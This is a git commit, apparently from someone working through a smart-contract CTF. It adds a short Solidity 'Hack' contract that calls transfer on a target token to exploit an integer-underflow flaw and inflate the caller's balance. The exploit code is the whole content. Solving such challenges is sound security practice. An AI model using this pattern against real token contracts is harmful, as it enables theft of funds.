90a89ef427e753bb729dd714d1b27ec2b1cd672e
lopeselio <lopeselio@gmail.com>
2023-01-21 17:20:12 +0530

    added hack contract update balance of msg.sender CTF complete

---
+++ Token/Hack.sol
@@ -0,0 +1,13 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8;
+
+interface IToken {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+}
+
+contract Hack {
+    constructor(address _target) {
+        IToken(_target).transfer(msg.sender, 1);
+    }
+}
